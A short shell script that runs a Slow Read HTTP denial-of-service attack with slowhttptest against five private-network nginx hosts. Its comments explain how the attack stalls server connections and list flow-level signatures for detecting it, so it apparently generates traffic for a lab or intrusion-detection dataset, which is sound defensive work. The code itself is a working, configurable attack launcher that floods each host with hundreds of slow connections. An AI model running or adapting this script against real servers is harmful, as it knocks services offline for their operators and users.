#!/bin/sh
# slow_read.sh — Slow Read HTTP DoS via slowhttptest.
#
# Advertises a tiny TCP receive window so nginx cannot flush its send buffer.
# The server holds each connection open for the full duration while the
# attacker drains the response a few bytes at a time.
#
# OIF signature: flow_duration_s very long (>60s), bwd_pkts_per_sec near zero
# (server stalled waiting for window to open), fwd_act_data_pkts = 1
# (attacker sends the request then goes silent).
#
# Distinct from Slowloris (attacker sends headers slowly) and Slow POST
# (attacker sends body slowly) — here the server is the slow party.
CONNS=${1:-200}
DURATION=${2:-120}

VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"

echo "[attack] Slow Read -> all nodes  $CONNS connections each  ${DURATION}s"
for ip in $VICTIMS; do
    # -X: slow read, -n: read interval, -k: requests per connection, -r: conn rate
    slowhttptest -X -c "$CONNS" -l "$DURATION" -n 5 -k 3 -r 50 -u "http://$ip/" &
done
wait